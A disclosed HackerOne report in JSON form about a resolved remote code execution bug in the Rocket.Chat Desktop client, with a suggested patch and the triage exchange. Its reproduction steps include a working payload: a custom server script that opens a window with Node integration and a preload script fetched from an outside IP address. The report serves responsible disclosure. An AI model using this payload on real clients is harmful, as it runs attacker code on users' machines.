{"id":943725,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDM3MjU=","url":"https://hackerone.com/reports/943725","title":"Remote Code Execution in Rocket.Chat-Desktop","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-07-27T12:00:29.604Z","submitted_at":"2020-07-27T12:00:29.604Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sectex","url":"/sectex","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19858,"url":"https://hackerone.com/rocket_chat","handle":"rocket_chat","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Rocket.Chat","twitter_handle":"RocketChat","website":"https://rocket.chat","about":"Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-07T14:40:26.343Z","bug_reporter_agreed_on_going_public_at":"2020-10-08T14:40:20.993Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Description:** Rocket.Chat-Desktop is vulnerable to remote code execution.\nAn attacker is able to create new BrowserWindow instances with a malicious preload script.\n\n## Releases Affected:\n\n  * Rocket.Chat-Desktop-Client: \u003c v3.0.0-develop\n\n## Steps To Reproduce (by setting up a malicious server):\n  1. Go to `Administration » Layout » Custom Scripts » Custom Script for Logged In Users`\n  1. Insert the following script:\n  `window.open('data:text/html,\u003ch1\u003ePWNED\u003c/h1\u003e', '', ['nodeIntegration=true', 'preload=\\\\\\\\45.155.173.235\\\\data\\\\cmd.js'].join(','))`\n  1. Click `Save changes`\n  1. Open Rocket.Chat-Desktop and connect to the server\n  1. CMD.exe will pop up.\n\n## Suggested mitigation\n\n  * [`src » preload » jitsi.js`](https://github.com/RocketChat/Rocket.Chat.Electron/blob/develop/src/preload/jitsi.js)\n  ```\n  const wrapWindowOpen = (defaultWindowOpen) =\u003e (href, frameName, features) =\u003e {\n       const settings = getSettings();\n\n       features = ''; // \u003c- should fix it\n\n       if (settings \u0026\u0026 url.parse(href).host === settings.get('Jitsi_Domain')) {\n         features = [\n           features,\n           'nodeIntegration=true',\n           `preload=${ `${ remote.app.getAppPath() }/app/preload.js` }`,\n         ].join(',');\n       }\n\n       return defaultWindowOpen.call(window, href, frameName, features);\n  };\n  ```\n\n## Impact\n\nRemote Code Execution in Rocket.Chat-Desktop","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e Rocket.Chat-Desktop is vulnerable to remote code execution.\u003cbr\u003e\nAn attacker is able to create new BrowserWindow instances with a malicious preload script.\u003c/p\u003e\n\n\u003ch2 id=\"releases-affected\"\u003eReleases Affected:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eRocket.Chat-Desktop-Client: \u0026lt; v3.0.0-develop\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce-by-setting-up-a-malicious-server\"\u003eSteps To Reproduce (by setting up a malicious server):\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eGo to \u003ccode\u003eAdministration » Layout » Custom Scripts » Custom Script for Logged In Users\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eInsert the following script:\n\u003ccode\u003ewindow.open(\u0026#39;data:text/html,\u0026lt;h1\u0026gt;PWNED\u0026lt;/h1\u0026gt;\u0026#39;, \u0026#39;\u0026#39;, [\u0026#39;nodeIntegration=true\u0026#39;, \u0026#39;preload=\\\\\\\\45.155.173.235\\\\data\\\\cmd.js\u0026#39;].join(\u0026#39;,\u0026#39;))\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eClick \u003ccode\u003eSave changes\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eOpen Rocket.Chat-Desktop and connect to the server\u003c/li\u003e\n\u003cli\u003eCMD.exe will pop up.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"suggested-mitigation\"\u003eSuggested mitigation\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FRocketChat%2FRocket.Chat.Electron%2Fblob%2Fdevelop%2Fsrc%2Fpreload%2Fjitsi.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003esrc » preload » jitsi.js\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst wrapWindowOpen = (defaultWindowOpen) =\u0026gt; (href, frameName, features) =\u0026gt; {\n   const settings = getSettings();\n\n   features = \u0026#39;\u0026#39;; // \u0026lt;- should fix it\n\n   if (settings \u0026amp;\u0026amp; url.parse(href).host === settings.get(\u0026#39;Jitsi_Domain\u0026#39;)) {\n     features = [\n       features,\n       \u0026#39;nodeIntegration=true\u0026#39;,\n       `preload=${ `${ remote.app.getAppPath() }/app/preload.js` }`,\n     ].join(\u0026#39;,\u0026#39;);\n   }\n\n   return defaultWindowOpen.call(window, href, frameName, features);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eRemote Code Execution in Rocket.Chat-Desktop\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-07T14:40:21.036Z","allow_singular_disclosure_after":-4465964.865821414,"singular_disclosure_allowed":true,"vote_count":38,"voters":["mzfr","mashoud1122","mik317","rahsec","badcracker","qtros","rudra_2000","prinzhorn","yusuf_furkan","3x3s","and 28 more..."],"severity":{"rating":"critical","score":9.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8773882,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @sectex \n\nthank you for your report. We have received it. I will analyze possible mitigation options and I will be in touch. \n\nBest\nMarkus","markdown_message":"\u003cp\u003eHi \u003ca href=\"/sectex\"\u003e@sectex\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003ethank you for your report. We have received it. I will analyze possible mitigation options and I will be in touch. \u003c/p\u003e\n\n\u003cp\u003eBest\u003cbr\u003e\nMarkus\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-28T04:31:37.250Z","updated_at":"2020-07-28T04:31:37.250Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9455330,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @markus-rocketchat,\n\nI installed v3.0.2 and it seems the issue is fixed.\nCan we disclose this report?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/markus-rocketchat\"\u003e@markus-rocketchat\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI installed v3.0.2 and it seems the issue is fixed.\u003cbr\u003e\nCan we disclose this report?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-08T07:10:20.122Z","updated_at":"2020-10-08T07:10:20.122Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9460163,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @sectex \nsorry for the late update, I was ooo.\n\nYes, this was fixed in the latest release. You can start the disclosure process if you like.\n\nThanks again for helping to make Rocket.Chat more secure for everyone!\n\nBest\nMarkus","markdown_message":"\u003cp\u003eHi \u003ca href=\"/sectex\"\u003e@sectex\u003c/a\u003e \u003cbr\u003e\nsorry for the late update, I was ooo.\u003c/p\u003e\n\n\u003cp\u003eYes, this was fixed in the latest release. You can start the disclosure process if you like.\u003c/p\u003e\n\n\u003cp\u003eThanks again for helping to make Rocket.Chat more secure for everyone!\u003c/p\u003e\n\n\u003cp\u003eBest\u003cbr\u003e\nMarkus\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-08T14:33:50.564Z","updated_at":"2020-10-08T14:33:50.564Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sectex","url":"/sectex"},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9460210,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-08T14:40:21.012Z","updated_at":"2020-10-08T14:40:21.012Z","first_to_agree":true,"actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9468418,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No problem! Thanks for letting me participate in your program!","markdown_message":"\u003cp\u003eNo problem! Thanks for letting me participate in your program!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-09T09:20:15.117Z","updated_at":"2020-10-09T09:20:15.117Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9756437,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-07T14:40:26.374Z","updated_at":"2020-11-07T14:40:26.374Z","actor":{"url":"/rocket_chat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Rocket.Chat"}},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}